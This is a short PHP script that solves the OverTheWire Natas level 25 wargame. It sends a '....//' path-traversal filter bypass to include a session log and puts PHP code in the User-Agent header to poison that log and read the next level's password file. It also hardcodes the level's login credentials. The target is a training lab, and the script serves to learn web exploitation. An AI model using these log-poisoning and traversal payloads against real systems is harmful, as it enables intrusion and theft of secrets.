<?php

$user = 'natas25';
$pass = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c';
$trick = '....//logs/natas25_indeedhat.log';
$ch = curl_init("http://natas25.natas.labs.overthewire.org?lang=$trick");

curl_setopt_array(
    $ch,
    [
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIE => 'PHPSESSID=indeedhat',
        CURLOPT_USERAGENT => '<?=file_get_contents("/etc/natas_webpass/natas26")?>',
        CURLOPT_USERPWD => "$user:$pass",
        CURLOPT_HTTPAUTH => CURLAUTH_BASIC
    ]
);

print curl_exec($ch);
